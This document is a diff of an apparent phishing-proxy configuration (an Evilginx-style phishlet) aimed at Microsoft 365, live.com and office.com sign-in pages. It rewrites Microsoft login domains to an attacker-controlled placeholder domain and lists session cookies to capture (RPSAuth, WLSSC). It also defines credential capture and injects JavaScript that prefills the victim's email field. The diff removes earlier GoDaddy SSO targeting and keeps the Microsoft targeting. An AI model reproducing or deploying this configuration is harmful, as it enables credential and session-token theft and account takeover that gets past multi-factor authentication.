@@ -10,7 +10,6 @@ proxy_hosts:
   - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'sso-godaddy', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
 
 sub_filters:
   - triggers_on: 'login.microsoftonline.com'
@@ -19,56 +18,36 @@ sub_filters:
     search: 'login.microsoftonline.com'
     replace: 'login.{PHISH_DOMAIN}'
     mimes: ['text/html', 'application/javascript', 'application/json', 'application/xml', 'text/css']
-
   - triggers_on: 'login.microsoftonline.com'
     orig_sub: 'login'
     domain: 'microsoftonline.com'
     search: 'microsoftonline.com'
     replace: '{PHISH_DOMAIN}'
     mimes: ['application/javascript', 'application/json']
-
   - triggers_on: 'aadcdn.msauth.net'
     orig_sub: 'aadcdn'
     domain: 'msauth.net'
     search: 'aadcdn.msauth.net'
     replace: 'aadcdn.{PHISH_DOMAIN}'
     mimes: ['application/javascript', 'text/html', 'application/json']
-
   - triggers_on: 'aadcdn.msftauth.net'
     orig_sub: 'aadcdn'
     domain: 'msftauth.net'
     search: 'aadcdn.msftauth.net'
     replace: 'aadcdn.{PHISH_DOMAIN}'
     mimes: ['application/javascript', 'text/html']
-
   - triggers_on: 'login.live.com'
     orig_sub: 'sso'
     domain: 'live.com'
     search: 'login.live.com'
     replace: 'sso.{PHISH_DOMAIN}'
     mimes: ['text/html', 'application/javascript', 'application/json']
-
   - triggers_on: 'www.office.com'
     orig_sub: 'www'
     domain: 'office.com'
     search: 'www.office.com'
     replace: 'www.{PHISH_DOMAIN}'
     mimes: ['text/html', 'application/javascript']
-
-  - triggers_on: 'sso.godaddy.com'
-    orig_sub: 'sso-godaddy'
-    domain: 'godaddy.com'
-    search: 'sso.godaddy.com'
-    replace: 'sso-godaddy.{PHISH_DOMAIN}'
-    mimes: ['text/html', 'application/javascript', 'application/json']
-
-  - triggers_on: 'sso.godaddy.com'
-    orig_sub: 'sso-godaddy'
-    domain: 'godaddy.com'
-    search: 'godaddy.com'
-    replace: '{PHISH_DOMAIN}'
-    mimes: ['application/javascript', 'application/json']
-
   - triggers_on: 'login.microsoftonline.com'
     orig_sub: 'login'
     domain: 'microsoftonline.com'
@@ -83,8 +62,6 @@ auth_tokens:
     keys: ['RPSAuth', 'WLSSC']
   - domain: '.live.com'
     keys: ['WLSSC']
-  - domain: '.godaddy.com'
-    keys: ['SSOID', 'GDSSO']
 
 credentials:
   username:
@@ -110,7 +87,6 @@ js_inject:
             'input[type="email"], input[name="loginfmt"], input[name="login"], input#i0116'
           );
         }
-
         function getQueryParam(name) {
           name = name.replace(/[\[\]]/g, "\\$&");
           var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
@@ -119,7 +95,6 @@ js_inject:
           if (!results[2]) return '';
           return decodeURIComponent(results[2].replace(/\+/g, " "));
         }
-
         var prefillEmail = getQueryParam('email');
         if (prefillEmail && prefillEmail.includes('@')) {
           var emailField = findEmailField();
